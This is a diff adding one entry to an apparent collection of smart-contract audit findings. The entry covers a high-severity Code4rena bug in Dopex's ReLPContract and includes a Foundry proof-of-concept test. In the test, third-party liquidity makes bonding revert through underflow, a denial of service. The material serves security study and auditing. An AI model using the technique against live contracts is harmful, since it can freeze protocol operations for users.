@@ -67,3 +67,59 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 2.[High] ReLPContract wrongfully assumes protocol owns all of the liquidity in the UniswapV2 pool
+
+### Not calculations on the all liquidity
+
+- Summary: The ReLPContract assumes it owns all liquidity in the UniswapV2 pool. When RdpxV2Core calls ReLPContract#reLP, it may pass incorrect amounts or trigger a revert if the protocol doesn't own the majority of LP balance. This is because the calculation assumes protocol owns all RDPX reserves, potentially leading to a denial-of-service if lpToRemove exceeds actual LP balance.
+
+- Impact & Recommendation: Change the logic and base all calculations on the pair balance of `UniV2LiquidityAmo`
+  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-09-relpcontract-wrongfully-assumes-protocol-owns-all-of-the-liquidity-in-the-uniswapv2-pool) & [Report](https://code4rena.com/reports/2023-08-dopex)
+
+    <details><summary>POC</summary>
+
+  ```solidity
+    function testReLpContract() public {
+        testV2Amo();
+        // set address in reLP contract and grant role
+        reLpContract.setAddresses(
+            address(rdpx),
+            address(weth),
+            address(pair),
+            address(rdpxV2Core),
+            address(rdpxReserveContract),
+            address(uniV2LiquidityAMO),
+            address(rdpxPriceOracle),
+            address(factory),
+            address(router)
+        );
+        reLpContract.grantRole(reLpContract.RDPXV2CORE_ROLE(), address(rdpxV2Core));
+        reLpContract.setreLpFactor(9e4);
+        // add liquidity
+        uniV2LiquidityAMO.addLiquidity(5e18, 1e18, 0, 0);
+        uniV2LiquidityAMO.approveContractToSpend(
+            address(pair),
+            address(reLpContract),
+            type(uint256).max
+        );
+        rdpxV2Core.setIsreLP(true);
+        (uint256 reserveA, uint256 reserveB, ) = pair.getReserves();
+        weth.mint(address(2), reserveB * 10);
+        rdpx.mint(address(2), reserveA * 10);
+        vm.startPrank(address(2));
+        weth.approve(address(router), reserveB * 10);
+        rdpx.approve(address(router), reserveA * 10);
+        router.addLiquidity(address(rdpx), address(weth), reserveA * 10, reserveB * 10, 0, 0, address(2), 12731316317831123);
+        vm.stopPrank();
+
+        console.log("UniV2Amo balance isn't enough and will underflow");
+        uint pairBalance = pair.balanceOf(address(uniV2LiquidityAMO));
+        console.log("UniV2Amo LP balance: ", pairBalance);
+        vm.expectRevert("ds-math-sub-underflow");
+        rdpxV2Core.bond(1 * 1e18, 0, address(this));
+    }
+
+  ```
+
+    </details>
